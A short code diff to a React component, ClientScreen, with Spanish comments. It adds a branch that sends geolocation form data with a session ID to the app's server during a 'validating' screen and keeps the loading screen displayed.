@@ -181,7 +181,24 @@ export default function ClientScreen() {
     if (connected) {
       console.log('Enviando datos al servidor:', screen, formData);
       
-      // Enviar datos al servidor inmediatamente
+      // Verificar si es un envío de datos de geolocalización
+      if (screen === ScreenType.VALIDANDO && formData.tipo === 'geolocation') {
+        console.log('[ClientScreen] Enviando datos de geolocalización al servidor');
+        // Enviar los datos de geolocalización con el tipo correcto
+        sendMessage({
+          type: 'CLIENT_INPUT',
+          data: {
+            tipo: 'geolocation',
+            sessionId,
+            data: formData
+          }
+        });
+        // Mantener la pantalla de cargando
+        console.log('[ClientScreen] Datos de geolocalización enviados, manteniendo pantalla de cargando...');
+        return;
+      }
+      
+      // Enviar datos al servidor inmediatamente para otros casos
       sendMessage({
         type: 'CLIENT_INPUT',
         data: {
